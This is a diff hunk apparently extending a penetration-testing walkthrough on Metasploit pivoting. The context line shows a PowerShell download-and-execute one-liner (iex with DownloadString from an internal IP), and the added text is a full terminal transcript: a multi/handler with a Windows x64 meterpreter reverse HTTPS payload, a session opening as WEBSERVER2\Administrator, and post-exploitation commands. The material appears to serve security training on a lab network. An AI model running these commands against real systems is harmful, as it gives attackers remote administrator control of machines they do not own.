@@ -510,3 +510,96 @@ C:\temp>powershell -c iex (New-Object Net.WebClient).DownloadString('http://192.
 
 Step 4 - Enjoy your meterprerter shell 
 ---------------------------------------
+
+jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem;  run -j"
+[sudo] password for jeff: 
+
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Use help <command> to learn more 
+about any command
+
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter_reverse_https
+LHOST => 192.168.1.30
+LPORT => 443
+EXITFUNC => thread
+ExitOnSession => false
+SessionCommunicationTimeout => 0
+EnableUnicodeEncoding => true
+HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started HTTPS reverse handler on https://192.168.1.30:443
+msf6 exploit(multi/handler) >
+msf6 exploit(multi/handler) > jobs
+
+Jobs
+====
+
+  Id  Name                    Payload                                Payload opts
+  --  ----                    -------                                ------------
+  0   Exploit: multi/handler  windows/x64/meterpreter_reverse_https  https://192.168.1.30:443
+
+msf6 exploit(multi/handler) > 
+[*] https://192.168.1.30:443 handling request from 192.168.1.76; (UUID: 80i4fng8) Redirecting stageless connection from /XB1XG-GIzPPUxtXEtxq8kACl1At33mOTIjBJ-K2hdD9ueKPXbgwF62gP9qn7q8RZEox2ZCn2W9oml2T7VUd4Ezm_L4IeTrtPzjyPm1uEg3Z with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+[*] https://192.168.1.30:443 handling request from 192.168.1.76; (UUID: 80i4fng8) Attaching orphaned/stageless session...
+[*] Meterpreter session 4 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2023-02-03 02:50:15 +0100
+
+msf6 exploit(multi/handler) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                  Connection
+  --  ----  ----                     -----------                  ----------
+  4         meterpreter x64/windows  WEBSERVER2\Administrator @   192.168.1.30:443 -> 127.0.0
+                                     WEBSERVER2                   .1  (192.168.1.76)
+
+msf6 exploit(multi/handler) > sessions -i 4
+[*] Starting interaction with 4...
+
+meterpreter > getuid
+Server username: WEBSERVER2\Administrator
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface  6
+============
+Name         : Microsoft ISATAP Adapter
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1280
+IPv6 Address : fe80::5efe:c0a8:14c
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 11
+============
+Name         : Intel(R) PRO/1000 MT Desktop Adapter
+Hardware MAC : 08:00:27:71:dc:96
+MTU          : 1480
+IPv4 Address : 192.168.1.76
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : 2a01:e34:ec47:9ed0:78a0:c16d:6763:f9ae
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+IPv6 Address : fe80::78a0:c16d:6763:f9ae
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+meterpreter > exit
+[*] Shutting down Meterpreter...
+
